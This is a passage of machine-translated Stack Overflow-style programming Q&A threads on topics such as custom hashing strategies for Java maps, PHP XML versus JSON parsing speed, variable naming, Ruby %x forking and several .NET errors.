事实上，我认为在 java.lang.Object 或 System.Object 中定义相等和哈希码是一个错误。尤其是平等很难以一种对继承有意义的方式来定义。我一直想写关于这个的博客……

但是，是的，基本上这个想法是合理的。

* * *

## 回答 #2

> 赞同：9
> 
> 时间：2013-11-17T12:43:03.600

对你来说有点晚了，但对于未来的访问者来说，可能值得知道 commons-collections 有一个`AbstractHashedMap`（在[3.2.2](https://commons.apache.org/proper/commons-collections/javadocs/api-3.2.2/org/apache/commons/collections/map/AbstractHashedMap.html)和[4.0](https://commons.apache.org/proper/commons-collections/javadocs/api-4.0/org/apache/commons/collections4/map/AbstractHashedMap.html)中的泛型）。您可以覆盖这些受保护的方法来实现您想要的行为：

```
protected int hash(Object key) { ... }
protected boolean isEqualKey(Object key1, Object key2) { ... }
protected boolean isEqualValue(Object value1, Object value2) { ... }
protected HashEntry createEntry(
    HashEntry next, int hashCode, Object key, Object value) { ... } 
```

这种替代方案的示例实现`HashedMap`是 commons-collections 自己的`IdentityMap`（仅高达[3.2.2](https://commons.apache.org/proper/commons-collections/javadocs/api-3.2.2/org/apache/commons/collections/map/IdentityMap.html)，因为 Java自 1.4 以来就有[自己的）。](https://docs.oracle.com/javase/8/docs/api/java/util/IdentityHashMap.html)

这不如为实例提供外部“ `Hasharator`”强大。`Map`您必须为每个散列策略（组合与继承反击......）实现一个新的映射类。但还是很高兴知道。

* * *

## 回答 #3

> 赞同：6
> 
> 时间：2014-12-31T23:31:46.447

[HashingStrategy](https://github.com/goldmansachs/gs-collections/blob/master/collections-api/src/main/java/com/gs/collections/api/block/HashingStrategy.java)是您正在寻找的概念。它是一个策略接口，允许您定义 equals 和 hashcode 的自定义实现。

```
public interface HashingStrategy<E>
{
    int computeHashCode(E object);
    boolean equals(E object1, E object2);
} 
```

您不能将 a`HashingStrategy`与内置的`HashSet`or一起使用`HashMap`。[GS Collections](https://github.com/goldmansachs/gs-collections)包括一个名为 java.util.Set`UnifiedSetWithHashingStrategy`和一个名为 的 java.util.Map `UnifiedMapWithHashingStrategy`。

让我们看一个例子。

```
public class Data
{
    private final int id;

    public Data(int id)
    {
        this.id = id;
    }

    public int getId()
    {
        return id;
    }

    // No equals or hashcode
} 
```

这是您如何设置`UnifiedSetWithHashingStrategy`和使用它的方法。

```
java.util.Set<Data> set =
  new UnifiedSetWithHashingStrategy<>(HashingStrategies.fromFunction(Data::getId));
Assert.assertTrue(set.add(new Data(1)));

// contains returns true even without hashcode and equals
Assert.assertTrue(set.contains(new Data(1)));

// Second call to add() doesn't do anything and returns false
Assert.assertFalse(set.add(new Data(1))); 
```

为什么不只使用 a `Map`？`UnifiedSetWithHashingStrategy`使用 a 的一半内存和 a 的`UnifiedMap`四分之一内存`HashMap`。有时您没有方便的键，必须创建一个合成键，例如元组。那会浪费更多的内存。

我们如何执行查找？请记住，集合有`contains()`，但没有`get()`。`UnifiedSetWithHashingStrategy`除了实现`Pool`之外`Set`，它还实现了`get()`.

这是处理不区分大小写字符串的简单方法。

```
UnifiedSetWithHashingStrategy<String> set = 
  new UnifiedSetWithHashingStrategy<>(HashingStrategies.fromFunction(String::toLowerCase));
set.add("ABC");
Assert.assertTrue(set.contains("ABC"));
Assert.assertTrue(set.contains("abc"));
Assert.assertFalse(set.contains("def"));
Assert.assertEquals("ABC", set.get("aBc")); 
```

这展示了 API，但它不适合生产。问题是 HashingStrategy 不断委托给`String.toLowerCase()`它创建一堆垃圾字符串。下面介绍如何为不区分大小写的字符串创建有效的散列策略。

```
public static final HashingStrategy<String> CASE_INSENSITIVE =
  new HashingStrategy<String>()
  {
    @Override
    public int computeHashCode(String string)
    {
      int hashCode = 0;
      for (int i = 0; i < string.length(); i++)
      {
        hashCode = 31 * hashCode + Character.toLowerCase(string.charAt(i));
      }
      return hashCode;
    }

    @Override
    public boolean equals(String string1, String string2)
    {
      return string1.equalsIgnoreCase(string2);
    }
  }; 
```

**注意：**我是 GS 收藏的开发人员。

* * *

## 回答 #4

> 赞同：4
> 
> 时间：2009-12-09T20:42:35.497

[Trove4j](http://trove4j.sourceforge.net/html/overview.html)具有我所追求的功能，他们称之为散列策略。

他们的 map 具有不同限制的实现，因此具有不同的先决条件，因此这并不隐含地意味着 Java 的“本机”HashMap 的实现是可行的。

* * *

## 回答 #5

> 赞同：3
> 
> 时间：2008-10-17T23:09:31.810

注意：正如所有其他答案中所述，HashMaps 没有明确的顺序。他们只承认“平等”。从基于散列的数据结构中获取顺序是没有意义的，因为每个对象都变成了散列——本质上是一个随机数。

你总是可以为一个类编写一个散列函数（而且通常是必须的），只要你仔细地去做。这是一件很难正确完成的事情，因为基于散列的数据结构依赖于散列值的随机、均匀分布。在 Effective Java 中，有大量文本专门用于正确实现具有良好行为的哈希方法。

话虽如此，如果您只是希望散列忽略 a 的大小写，则可以为此目的`String`编写一个包装类并将其插入数据结构中。`String`

一个简单的实现：

```
public class LowerStringWrapper {
    public LowerStringWrapper(String s) {
        this.s = s;
        this.lowerString = s.toLowerString();
    }

    // getter methods omitted

    // Rely on the hashing of String, as we know it to be good.
    public int hashCode() { return lowerString.hashCode(); }

    // We overrode hashCode, so we MUST also override equals. It is required
    // that if a.equals(b), then a.hashCode() == b.hashCode(), so we must
    // restore that invariant.
    public boolean equals(Object obj) {
        if (obj instanceof LowerStringWrapper) {
            return lowerString.equals(((LowerStringWrapper)obj).lowerString;
        } else {
            return lowerString.equals(obj);
        }
    }

    private String s;
    private String lowerString;
} 
```

* * *

## 回答 #6

> 赞同：0
> 
> 时间：2008-10-18T01:35:09.833

好问题，问乔希布洛赫。我在 java 7 中将该概念作为 RFE 提交，但它被丢弃了，我相信原因与性能有关。不过，我同意，应该这样做。

* * *

## 回答 #7

> 赞同：0
> 
> 时间：2008-10-18T15:43:56.700

我怀疑这还没有完成，因为它会阻止 hashCode 缓存？

我尝试创建一个通用 Map 解决方案，其中所有键都被静默包装。事实证明，包装器必须保存被包装的对象、缓存的 hashCode 和对负责相等检查的回调接口的引用。这显然不如使用包装类有效，在这种包装类中，您只需要缓存原始密钥加上一个对象（请参阅 hazzens 答案）。

（我还遇到了一个与泛型相关的问题；get 方法接受 Object 作为输入，因此负责散列的回调接口必须执行额外的 instanceof-check。要么这样，要么映射类必须知道 Class它的钥匙。）

* * *

## 回答 #8

> 赞同：0
> 
> 时间：2008-10-18T16:26:48.203

这是一个有趣的想法，但对于性能来说绝对是可怕的。这样做的原因对于[哈希表的概念](http://en.wikipedia.org/wiki/Hash_table)来说是非常基本的：不能依赖排序。哈希表非常快（[恒定时间](http://en.wikipedia.org/wiki/Constant_time)），因为它们索引表中元素的方式：通过计算该元素的伪唯一整数哈希并访问数组中的该位置。它实际上是计算内存中的位置并直接存储元素。

这与平衡二叉搜索树`TreeMap`（维基百科有一些[更深入的分析](http://en.wikipedia.org/wiki/Binary_search_tree)。总而言之，树状图的效率取决于一致的顺序，因此元素的顺序是可预测且合理的。但是，由于“遍历到目的地”方法对性能的影响，BST 只能提供*O(log(n))*性能。对于大型地图，这可能会对性能造成重大影响。

可以在哈希表上施加一致的排序，但这样做涉及使用`LinkedHashMap`与手动维护排序类似的技术。或者，可以在内部维护两个单独的数据结构：哈希表和树。该表可用于查找，而树可用于迭代。问题当然是这使用了两倍以上的所需内存。此外，插入的速度仅与树一样快：O(log(n))。并发技巧可以稍微降低这一点，但这不是可靠的性能优化。

简而言之，您的想法*听起来*确实不错，但如果您真的尝试实现它，您会发现这样做会带来巨大的性能限制。最终的结论是（并且已经持续了几十年）：如果您需要性能，请使用哈希表；如果您需要排序并且可以忍受性能下降，请使用平衡二叉搜索树。恐怕真的没有有效地结合这两种结构而不会失去其中一种或另一种的一些保证。

* * *

## 回答 #9

> 赞同：0
> 
> 时间：2011-04-18T10:54:45.037

中有这样的功能`com.google.common.collect.CustomConcurrentHashMap`，不幸的是，目前还没有公开的方式来设置`Equivalence`（他们的`Hasharator`）。也许他们还没有完成它，也许他们认为该功能还不够有用。在[番石榴邮件列表中](https://groups.google.com/forum/#!forum/guava-discuss)询问。

我想知道为什么它还没有发生，正如两年多前的[演讲中提到的那样。](http://www.youtube.com/watch?v=9ni_KEkHfto)

# xhtml - XHTML：标记到多个目标框架中的多个目的地？

> ID：214140
> 
> 赞同：1
> 
> 时间：2008-10-17T23:09:19.893
> 
> 标签：xhtml, tags, anchor

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2008-10-17T23:14:42.407

简短的回答：没有。

更长的答案：根据您的描述，严格使用 X/HTML，这是不可能的。但是，您可以添加 javascript 来更改 iframe src。就像是：

```
function click_link(id) {
    document.getElementById('iframe1').src = "page.ext?id=" + id;
    document.getElementById('iframe2').src = "other_page.ext?id=" + id;
} 
```

但是，当然，您可能无论如何都不应该使用 iframe...

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2008-10-17T23:18:22.947

最简单的方法是 javascript，但该方法已经得到解答。做到这一点的唯一方法（不依赖于 javascript）是服务器端。

使您的 <a target > 链接回到包含您要更改的所有框架的顶部框架集，并在服务器端更改框架的 src 属性。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2008-10-19T01:13:52.507

不要使用框架。它们不利于可用性，不利于 SEO，并会导致此类问题。

这似乎是无用的建议，但实际上从长远来看，您会避免很多麻烦。

如果您在服务器端合并文件，它们将在每个浏览器、搜索引擎等中正常工作。重新加载一个简单的页面不必比加载 2 个 iframe 慢。

或者，在显示带有描述的照片时，一个简单的 DHTML 就可以完成这项工作：

```
img.onclick = function(){
   $('bigphoto').src = this.src.replace(/_small/,'_big');
   $('description').innerHTML = this.title;
} 
```

# php - 是什么减少了 PHP 服务器的负载：SimpleXML 或 json_decode？

> ID：214143
> 
> 赞同：7
> 
> 时间：2008-10-17T23:10:05.413
> 
> 标签：php, performance, scalability, simplexml, json

我开始用 PHP 开发一个 web 应用程序，我希望它会变得非常流行，让我变得有名和富有。:-)

如果到了那个时候，我决定是使用 SimpleXML 将 API 的数据解析为 XML 还是使用 json_decode 可能会对应用程序的可扩展性产生影响。

有谁知道这些方法中哪一种对服务器更有效？

**更新：**我进行了初步测试，看看哪种方法性能更高。执行起来似乎`json_decode`比`simplexml_load_string`. 这并不是非常确定的，因为它不会测试诸如并发进程的可伸缩性之类的东西。我的结论是，我将暂时使用 SimpleXML，因为它支持 XPath 表达式。

```
<?php

$xml  = file_get_contents('sample.xml');
$json = file_get_contents('sample.js');

$iters = 1000;

// simplexml_load_string
$start_xml = microtime(true);
for ($i = 0; $i < $iters; ++$i) {
    $obj = simplexml_load_string($xml, 'SimpleXMLElement', LIBXML_NOCDATA);
}
$end_xml = microtime(true);

// json_decode
$start_json = microtime(true);
for ($i = 0; $i < $iters; ++$i) {
    $obj = json_decode($json);
}
$end_json = microtime(true);

?>
<pre>XML elapsed: <?=sprintf('%.4f', ($end_xml - $start_xml))?></pre>
<pre>JSON elapsed: <?=sprintf('%.4f', ($end_json - $start_json))?></pre> 
```

结果：

```
XML elapsed: 9.9836
JSON elapsed: 8.3606 
```

* * *

## 回答 #1

> 赞同：10
> 
> 时间：2008-10-17T23:13:44.843

作为“更轻”的格式，我希望 JSON 对服务器的压力会稍微小一些，但我怀疑这将是您发现自己处理的最大性能问题，因为您的网站越来越受欢迎。使用您更喜欢的格式。

Alternatively, if you know how you'll be structuring your data, you could try making an XML-formatted version and a JSON-formatted version and just run it against your setup a few hundred thousand times to see if it makes a noticeable difference.

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2008-10-18T01:11:59.537

There's only one way to determine which is going to be easier on your server in your application with your data.

Test it!

I'd generate some data that looks similar to what you'll be translating and use one of the unit testing frameworks to decode it a few thousand times using each of SimpleXML and json_decode, enough to get meaningful results. And then you can tell us what worked.

Sorry this isn't exactly the sort of answer you were looking for, but in reality, it's the only right way to do it. Good luck!

* * *

## 回答 #3

> 赞同：3
> 
> 时间：2008-10-19T13:00:11.427

Not really an answer to the question, but you could just wait until you have lots of users hitting your system. You may be surprised where your bottlenecks actually lie:

[http://gettingreal.37signals.com/ch04_Scale_Later.php](http://gettingreal.37signals.com/ch04_Scale_Later.php)

# ruby - 代码如何“自我记录”而不令人讨厌？

> ID：214160
> 
> 赞同：35
> 
> 时间：2008-10-17T23:18:53.197
> 
> 标签：ruby, documentation, readability

我不确定这里的最佳实践是什么，但我经常看到缩写的变量名，尤其是在范围很小的时候。所以（使用简单的 Ruby 示例）而不是`def add_location(name, coordinates)`，我看到类似的东西`def add_loc(name, coord)`——我什至可能看到类似的东西`def add_loc(n, x, y)`。*我想当一个人习惯于看到缩写时，较长的名字可能会让他们感到厌烦。*

冗长是否有助于可读性，还是只会伤害每个人的眼睛？——人们更喜欢缩写和缩短的名字而不是更长的名字吗？

* * *

## 回答 #1

> 赞同：55
> 
> 时间：2008-10-17T23:20:16.033

就个人而言，我宁愿看到更长的名字，实际上意味着什么，而不必先确定上下文。当然，对于没有真正意义的变量，例如计数器，我仍然使用小的无意义的变量名称（例如`i`or `x`），但大多数时候**冗长是清晰的。**公共 API 尤其如此。

然而，这可能太过分了。过去我曾见过一些 VB 代码那样荒谬。像其他一切一样适度！

* * *

## 回答 #2

> 赞同：14
> 
> 时间：2008-10-17T23:21:42.830

永远不要缩写。

* * *

## 回答 #3

> 赞同：14
> 
> 时间：2008-10-17T23:23:43.233

实际上，我一直使用长变量名，毕竟现代 IDE 和文本编辑器都已完成，因此使用`index`if i. 我唯一的例外是在处理坐标 b/c`x`并`y`在那里最有意义时。

* * *

## 回答 #4

> 赞同：12
> 
> 时间：2008-10-18T00:04:32.823

变量应该被赋予尽可能短的名称，以充分表达其目的。

过于冗长往往会掩盖语法，而语法很重要。

在整个程序（或应用程序/系统）中，变量应该以一致的风格命名，类似的东西应该以类似的方式命名。如果语言社区中存在约定，则应遵守（所以不要使用 camelCaseRubyVariableNames），除非有令人信服的理由不这样做。

缩写，如果使用，应该在任何地方一致地应用，如果是特定领域的，应该记录在某个地方。如果有人打算在代码上花费任何有用的时间，那么他们很快就会学会。

如果您需要组合多达五个或六个单词来命名一个变量，那么我建议您可能正在查看[代码气味](http://c2.com/cgi/wiki?CodeSmell)，并且您正在工作的例程可能会受益于一些工作。

但是，大多数情况下，如果您意识到这些陷阱并真正*考虑*您正在编写的内容，那么您的代码很可能是合理的。想象一下你自己向一位新同事描述你正在开发的功能——你认为你需要说的越少，代码可能就越好。

* * *

## 回答 #5

> 赞同：10
> 
> 时间：2008-10-17T23:31:22.797

尝试在 1 年后阅读您自己的代码。您将看到自我记录变量名称的值和代码注释的值（特别是干净代码的值）

当你获取别人的源代码并且你不理解它时，很容易认为“他不像我那样优秀的程序员”但是当你意识到你自己的代码很难阅读时，你会想：“我是什么？想？”

从长远来看，冗长有助于可维护性。对于简短的一行脚本，您仍然可以使用“setLocNm”而不是 setLocationName”

*任何傻瓜都可以编写计算机可以理解的代码。优秀的程序员编写人类可以理解的代码。* **——马丁·福勒**

* * *

## 回答 #6

> 赞同：7
> 
> 时间：2008-10-17T23:25:57.033

就个人而言，我发现冗长是件好事，但也很容易过于冗长，这是一件坏事。有一种平衡，缩写也可以达到这种平衡。

这些是我的一般规则：

*   迭代器可以是一个字母，即。`i`, `j`,`k`等
*   其他单字变量，如布尔切换，你从来没有缩写过，即。`installing`,`done`等。
*   多个单词变量和函数名称是缩写的候选者，但前提是它们开始变得非常长（例如，20-25+ 个字符）。智能缩写是这里的关键。`function => func`例如，但从不`fun`, `f`, 或`functi`

* * *

## 回答 #7

> 赞同：6
> 
> 时间：2008-11-14T17:47:26.517

我浏览了答案，但我不知道是否涵盖了以下内容。来了……

无论你是缩写还是冗长，只要确保你没有使用不必要的单词，并且意思很明显。

但是，即使在此过滤之后，如果您的标识符看起来很冗长，您的设计也存在缺陷。

```
def initialize_report_template()
end 
```

本来应该...

```
class ReportTemplate
    def initialize()
    end
end 
```

* * *

## 回答 #8

> 赞同：3
> 
> 时间：2008-10-17T23:23:45.400

更长的名字更好。您提到您经常在小范围内看到缩写名称。谁说随着软件的增长，范围仍然很小？

当然，XCoordinateForCurrentLocationOfSelf 是一个荒谬的名字，所以要合理。尤其是当你走进一个你以前没有参与过的项目时，你会感谢任何使用描述性函数和变量名的人。

* * *

## 回答 #9

> 赞同：3
> 
> 时间：2008-10-17T23:47:59.940

我认为当名称会损害可读性或只是多余时，可以缩写。

示例 1：类型已经传达所有必要信息的方法的参数。

示例 2：一个明显会被大量使用的变量

```
StringBuilder sb = ...
sb.append(...
sb.append(...
return sb.toString(); 
```

示例 3：惯用缩写。i,j,k 已经被提及。上面的“sb”是我们代码中的一个，每个团队可能还有几个。

* * *

## 回答 #10

> 赞同：3
> 
> 时间：2008-10-18T00:45:21.507

目标是更短而不是更长，但读者的理解应该胜过每次[打字的懒惰。](http://steve-yegge.blogspot.com/2008/09/programmings-dirtiest-little-secret.html)

正如其他人所说，变量名称长度不应混淆逻辑或算法。例如，在算术中，我们写

```
( 1 + 5 ) * 3 = 18 
```

而不是

```
three multiplied by the sum of one and five equals eighteen 
```

因为我们试图将注意力吸引到表达中所涉及元素的清晰度之外的其他事情上。

我倾向于将变量保留为一到三个单词，仅当我超过 24 个字符左右时才缩写。变量使用的频率越低，我就越有可能随意将变量名变长。更常用的变量我会缩短。

* * *

## 回答 #11

> 赞同：2
> 
> 时间：2011-02-27T22:10:10.437

Bugzilla 的首席架构师 Max Kanat-Alexander 在他的博客上这样说：

> 代码本身占用的空间应该与它所具有的意义成正比。
> 
> 基本上，意义重大的微小符号使代码难以阅读。意义不大的长名称也会使代码难以阅读。意义的数量和占用的空间应该是密切相关的。

[http://www.codesimplicity.com/post/readability-and-naming-things/](http://www.codesimplicity.com/post/readability-and-naming-things/)

这是一篇关于命名事物的非常有见地的帖子。我敦促大家阅读它！

* * *

## 回答 #12

> 赞同：1
> 
> 时间：2008-10-17T23:21:49.883

我唯一接受缩写的情况是局部变量只在一小段时间范围内。

这意味着它们应该以非常易读的方法或构造函数进入范围。

* * *

## 回答 #13

> 赞同：1
> 
> 时间：2008-10-17T23:27:03.460

我同意基尔霍夫的观点；我更喜欢在几乎所有上下文中看到描述性变量名称。如果我的变量名超过 20 个字符左右，我会缩写，通常在变量名中使用单词（例如：“SomeVeryLongVarValue”）。

当然，我也尽可能使用匈牙利符号，所以我很可能属于另一个极端阵营，试图让我的变量名称过于描述性，这取决于你的观点。

* * *

## 回答 #14

> 赞同：1
> 
> 时间：2008-10-18T00:10:08.707

我可能会完全被嘘，但我想确保听到这种观点。

虽然较长的变量名称可能更具描述性，但它们可能会开始陷入程序的原始意图。我觉得在 API 元素上，在使用它们的上下文中具有清晰且有意义的名称非常重要。

在每个功能或方法中，这通常是一个不同的故事。我尽量少写，保持简洁。这被称为[阿特伍德先生](http://www.codinghorror.com/blog/archives/001148.html)的斯巴达编程和[这个](http://ssdl-wiki.cs.technion.ac.il/wiki/index.php/SendAnEmail_case_study)漂亮的例子。是的，这个例子显然是被操纵的，但它确实证明了少一点仪式实际上可以使阅读程序更容易。

祝你好运。

* * *

## 回答 #15

> 赞同：0
> 
> 时间：2008-10-17T23:25:13.493

在编程时，您使用语法以便人类可以阅读它，变量名称、方法等的长度确实无关紧要。

通常越详细越好，在良好的开发环境下，无论如何您都应该有代码完成功能，因此您只需点击“add_L”+TAB 即可完成方法调用。

* * *

## 回答 #16

> 赞同：0
> 
> 时间：2008-10-17T23:46:45.167

我认为缩写的主要问题是**并非所有人都以相同的方式缩写**，所以当你和很多人一起工作时，它只会增加编码时出错的可能性。例如，如果您有一个可以称为 SOMETHING_INTERFACE 的常量，也许一些开发人员会将其缩写为 SOMETHING_INTFACE，其他人会缩写为 SOMETHING_IFACE 或 SOMETHING_IF、SMTHING_IFACE...

只用两个词，你就可以有至少六个或多或少的“逻辑”可能的缩写，所以我认为在大多数情况下，如果你想拥有自我记录的代码，最好不要使用缩写并且有更多的理由.

很长的名称有时会很烦人，但也可以在非常局部的范围内使用辅助变量进行缩写。

* * *

## 回答 #17

> 赞同：0
> 
> 时间：2008-11-14T17:55:28.733

大多数人视读，阅读一个单词不再需要阅读单个字母。所以总是使用有意义的名字。它们是否必须是完整的 7 个单词的描述，不，但它们需要足够长才能理解。

我可以接受 add_loc(name, coord)，因为它们足够长，我可以分辨它们是什么。在 add_loc(n, x, y) 中，我会反对“n”而不是名称。我可以使用 X 和 Y，因为这些是公认的坐标名称。

对于不熟悉坐标系的人，我可以看到 add_location(name, coordinates) 在哪里更有意义。

如有疑问，请使用更长的名称。

* * *

## 回答 #18

> 赞同：0
> 
> 时间：2009-02-06T07:31:43.393

*“弄清楚谋杀之谜是可以的，但你应该不需要弄清楚代码。你应该能够阅读它。”* ——史蒂夫·C·麦康奈尔

也就是说，如果您认为您或其他任何人都需要过于明确的变量名称等，请随意缩短它们。

* * *

## 回答 #19

> 赞同：-1
> 
> 时间：2009-01-04T22:35:07.773

我建议采取极简主义的方法。尽量少用，同时确保你的代码保持清晰、简洁和中肯。

* * *

## 回答 #20

> 赞同：-2
> 
> 时间：2008-10-17T23:51:13.193

超出范围的东西，如常量和全局变量应该有很长的描述性名称。有时，一个很长的名字会让它“闻起来”，足以表明它的存在是不受欢迎的。这是一件好事，因为它会 1 - 使人们避免它， 2 - 增加重构代码以使其消失的压力。

# x11 - 令人困惑的_NET_SUPPORTING_WM_CHECK

> ID：214183
> 
> 赞同：2
> 
> 时间：2008-10-17T23:28:11.710
> 
> 标签：x11, xlib, icccm, ewmh

我正在尝试使我的窗口管理器符合 ICCCM 规范。我完全理解 _NET_SUPPORTING_WM_CHECK 原子的原因 - 这可以确保在窗口管理器不再运行时不会留下无效信息。

我不明白的是，为什么除了 _NET_WM_NAME 和 _NET_SUPPORTING_WM_CHECK 本身之外，支持窗口上没有像 _NET_NUMBER_OF_DESKTOPS 这样的其他原子。

窗口管理器应该设置和覆盖数据，但如果新窗口管理器不兼容，这可能会产生误导。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2009-04-10T18:14:54.120

那么你所说的原子不是ICCCM。它们属于较新的[EWMH](http://en.wikipedia.org/wiki/Extended_Window_Manager_Hints)

所以基本上它是这样的。

首先我们有ICCCM。他们是

*   老的
*   成熟
*   大多数窗口管理器（全部或部分）支持
*   易于实施
*   Unix标准

然后我们有 EWMH

*   较新（GNOME 和 KDE）
*   没有多少窗口管理器支持它们
*   更复杂（例如虚拟桌面）
*   免费桌面标准。

Freedesktop 希望使 EWMH 尽可能广泛（除了 GNOME 和 KDE），这就是为什么大多数原子是应该而不是必须的。他们为小窗口管理器提供了一个声称合规的机会。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2010-10-05T13:40:28.903

我认为这个想法是您必须检查是否支持某个属性，如果支持，则仅从根窗口使用它。

_NET_SUPPORTING_WM_CHECK 窗口是在许多其他属性已经存在之后添加的，如果我没记错的话。

# ruby - Ruby %x 在 64 位 Linux 上分叉，但不是在 32 上，而且只有特定的语法

> ID：214205
> 
> 赞同：2
> 
> 时间：2008-10-17T23:47:00.503
> 
> 标签：ruby, exec, fork

这是一些Ruby代码：

```
puts %x{ pstree #{$$} }   # never forks
puts %x{ pstree '#{$$}' } # forks on amd64 only 
```

在 32 位 Ubuntu Dapper 上，我得到以下输出：

```
t.rb---pstree
t.rb---pstree 
```

这对我来说很有意义。但是在 64 位 Ubuntu Hardy 上，我得到了这个：

```
t.rb---sh---pstree
t.rb---pstree 
```

这里显示的是 Ruby 在执行前分叉只是其中一种情况。当我将代码放在一个文件中并在 strace -fF 下运行它时，它似乎在 64 位 Hardy 上调用`clone()`(like `fork()`) before `execve()`，而在 32 位 Dapper 上它没有这样的事情。

我的 Ruby 版本是：

```
ruby 1.8.4 (2005-12-24) [i486-linux]
ruby 1.8.6 (2007-09-24 patchlevel 111) [x86_64-linux] 
```

我应该尝试更多地混合和匹配解释器、操作系统和字长，但现在这并不容易，因为我不管理这些机器。也许你们中的某个人可以告诉我这些命令在 64 位系统上的区别是什么，更不用说为什么它们在 32 位系统上的工作方式相同了。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2008-10-18T00:27:13.293

当 %x 与单个参数一起使用时（就像您正在做的那样），Ruby 执行 shell 扩展。

这是我对发生了什么的猜测：

Ruby scans the command to determine if there are any special characters that would result in the need to perform shell expansion, if so it calls the shell to do that. In the second example the single quotes are enough to make Ruby want to call the shell to do the expansion, hence the fork. In the first example Ruby can determine that shell expansion is not needed as the command contains no special characters (after variable expansion), hence no fork. The difference between the two versions probably has to do with an internal change in how ruby tries to determine is shell expansion is needed. I get a fork for the second example on ruby 1.8.5 on a 32-bit machine.

[EDIT]

Okay, I took a look at the source code for ruby 1.8.4 and 1.8.6 and both versions use the same criteria to determine whether or not to call a shell to perform shell expansion, if any of the following characters exist in the command line the shell will be invoked when one argument to %x is provided:

```
*?{}[]<>()~&|\\$;'`"\n 
```

Ruby is actually calling the shell in both cases (in example that contains the quotes), the reason you are seeing different outputs from `pstree` is due to differences in the the `sh` command on the different machines, one calls `fork`, the other doesn't. To see this for yourself, run this command on both machines:

```
/bin/sh -c "pstree $$" 
```

This is the command that Ruby is using to execute `pstree` in the example with quotes on both machines. You should see `bash---pstree` on the 32-bit machine and `bash---sh---pstree` on the other one.

So now I'm curious, what led you to discover this difference and is it causing a problem?

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2011-09-24T18:47:09.837

I went through this situation by developing an asynchronous processor work that has a series of subprocesses(fork), and it happened when the master was in the foreground and received a SIGINT.

I run: puts "the result is %(monster-delayed-job)"

and the output was only: "the result is "

*   Yes, Im "trap" SIGINT in the master

Andre

# asp.net - RadioButtonList 异常

> ID：214210
> 
> 赞同：4
> 
> 时间：2008-10-17T23:51:55.140
> 
> 标签：asp.net, asp.net-mvc

升级到测试版后，我遇到了 Html.RadioButtonList 的问题。有人可以告诉我我做错了什么吗？

编码：

```
<% Html.RadioButtonList(
    "voter" + voter.Id,
    new SelectList(new[]{"yes","no","abstain"}, "yes")).Each(x => Response.Write(x)); %> 
```

我得到的例外是：

```
[ArgumentNullException: Value cannot be null.
Parameter name: value]
   System.Web.Mvc.Html.InputExtensions.RadioButton(HtmlHelper htmlHelper, String name, Object value, Boolean isChecked, IDictionary`2 htmlAttributes) +214
   Microsoft.Web.Mvc.<>c__DisplayClass1.<RadioButtonListInternal>b__0(ListItem item) in c:\dd\Cicero\src\Mvc\main\src\MvcFutures\Mvc\RadioExtensions.cs:86
   System.Linq.WhereSelectListIterator`2.MoveNext() +107
   System.Linq.Buffer`1..ctor(IEnumerable`1 source) +259
   System.Linq.Enumerable.ToArray(IEnumerable`1 source) +81
   Microsoft.Web.Mvc.RadioListExtensions.RadioButtonListInternal(HtmlHelper htmlHelper, String name, SelectList selectList, Boolean usedViewData, IDictionary`2 htmlAttributes) in c:\dd\Cicero\src\Mvc\main\src\MvcFutures\Mvc\RadioExtensions.cs:88
   Microsoft.Web.Mvc.RadioListExtensions.RadioButtonList(HtmlHelper htmlHelper, String name, SelectList selectList) in c:\dd\Cicero\src\Mvc\main\src\MvcFutures\Mvc\RadioExtensions.cs:29 
```

提前谢谢了！
抢

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2008-10-18T04:57:00.610

看起来您可能在 MVC 框架中发现了一个错误。RadioButtonList 的其他重载似乎工作得很好，但是那个特殊的重载会出错。

通过查看 Reflector（并使用堆栈跟踪），我看起来在这一行出现了问题：

```
 return selectList.GetListItems().Select<ListItem, string>(delegate (ListItem item) {
    return htmlHelper.RadioButton(name, item.Value, item.Selected, htmlAttributes);
}).ToArray<string>(); 
```

在 Microsoft.Web.Mvc.RadioListExtensions.RadioButtonListInternal 方法中。我假设这段代码在 Preview 5 中运行良好？

# c# - 用户绘制的控件正在使用以前的表单背景

> ID：214215
> 
> 赞同：1
> 
> 时间：2008-10-17T23:53:53.500
> 
> 标签：c#, .net, winforms, user-controls, onpaint

我在表单上有几个用户绘制的控件，不幸的是，当显示表单时，用户绘制的控件显示的是以前的表单背景，而不是当前的表单背景。

OnPaint 事件很简单，OnBackgroundPaint 事件为空……

像这样：

```
 protected override void OnPaint(PaintEventArgs pe)
    {
        pe.Graphics.DrawImageUnscaled(_bmpImage, 0, 0);            
    }

    protected override void OnPaintBackground(PaintEventArgs pevent)
    {
        //Leave empty...
    } 
```

如何让当前背景成为显示的透明度，而不是前一个表单的背景？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2008-10-19T04:39:20.660

您需要设置窗口样式 - 这是一篇[不错的基本文章](https://web.archive.org/web/20141227200000/http://bobpowell.net/transcontrols.aspx)。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2008-10-19T04:54:55.807

您似乎正在覆盖该`OnPaintBackground`方法而不对背景做任何事情。由于您将其留空，因此您可能一开始就不应该覆盖它。当您让默认`OnPaintBackground`处理程序完成其工作时会发生什么？那不应该自动正确地绘制当前控件的背景吗？

PS 我从未使用过自定义绘画 .Net 控件。我只是在猜测，试图帮助您找到解决问题的方法。如果我的建议完全不正确，请原谅我...

# .net - 帮助排除 System.BadImageFormatException：

> ID：214223
> 
> 赞同：3
> 
> 时间：2008-10-18T00:02:42.797
> 
> 标签：.net, debugging, exception, mstest, xunit.net

在通过联系本地 Web 服务的 .NET 3.5 SP1 项目进行调试时，我收到异常

System.BadImageFormatException：“错误的类令牌”

当然，没有更多关于导致异常的详细信息。

我可以看出发生这种情况的方法，它与调用者在同一个类中，调试器无法到达。此异常发生在调用联系 Web 服务的方法时。我确实有其他方法与 Web 服务通信，所以参考很好。

~~我对该方法的单元测试也因同样的异常而失败。~~
**更正**：我对该方法的单元测试是成功的，加剧了混乱。

有谁知道追踪此异常的方法？我已阅读有关异常类的文档，这使我相信其中一个程序集的版本不正确，或者构建存在问题。

在解决此异常时，您还建议采取哪些其他步骤？

* * *

## 回答 #1

> 赞同：3
